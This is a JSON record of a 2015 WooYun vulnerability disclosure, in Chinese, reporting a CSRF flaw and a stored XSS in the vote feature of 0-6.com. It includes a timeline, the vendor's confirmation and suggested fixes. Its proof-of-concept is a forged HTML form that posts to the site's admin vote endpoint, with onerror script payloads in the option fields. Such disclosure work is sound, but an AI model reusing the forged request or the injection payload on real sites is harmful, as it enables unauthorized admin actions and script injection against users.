{"id": 33721, "wybug_id": "wooyun-2015-0108174", "wybug_title": "妈妈网某处一枚CSRF", "wybug_corp": "0-6.com", "wybug_author": "第四维度", "wybug_date": "2015-04-16 10:06", "wybug_open_date": "2015-06-02 15:38", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向公众公开  简要描述： 附加一枚XSS 详细说明：  第一枚：CSRF\n\n测试位置处，发起一个新的测试\n\n可以看到提交的表单，有csrf。我们构造表单本地提交看看。\n<form method=\"POST\" name=\"form0\" action=\"http://my.0-6.com:80/admin/App/Vote/save.do\"><input type=\"hidden\" name=\"AppVoteInfo.Id\" value=\"\"/><input type=\"hidden\" name=\"AppVoteInfo.OptionCount\" value=\"\"/><input type=\"hidden\" name=\"AppVoteInfo.Name\" value=\"csrftest\"/><input type=\"hidden\" name=\"AppVoteInfo.Note\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\" <img src\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\" <img src\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"<img src=\"x\"onerror=\"alert(1)\">\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"<img src=\"x\"onerror=\"alert(1)\">\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"<img src=\"x\"onerror=\"alert(1)\">\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"0\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionId\" value=\"\"/><input type=\"hidden\" name=\"VoteOptionTitle\" value=\"\"/><input type=\"hidden\" name=\"AppVoteInfo.MutSelect\" value=\"0\"/><input type=\"hidden\" name=\"AppVoteInfo.VoteLevel\" value=\"0\"/><input type=\"hidden\" name=\"LimitYear\" value=\"2015\"/><input type=\"hidden\" name=\"LimitMonth\" value=\"4\"/><input type=\"hidden\" name=\"LimitDay\" value=\"22\"/><input type=\"hidden\" name=\"LimitHour\" value=\"17\"/><input type=\"hidden\" name=\"AppVoteInfo.HomePageShow\" value=\"1\"/><input type=\"hidden\" name=\"Invite\" value=\"1\"/></form>\n\n\n投票成功我们查看一下\n\n投票位置同样存在。第二枚：XSS刚刚单独提交了一枚投票处的XSS，测试位置同样存在一枚。\n\n   漏洞证明：  \nhttp://12293623.0-6.com/\n使用IE访问可以触发跨站。   修复方案：  #csrf1、token2、判断来源#XSS1、html转义   版权声明：转载请注明来源 第四维度@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-18 15:36 厂商回复： 已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}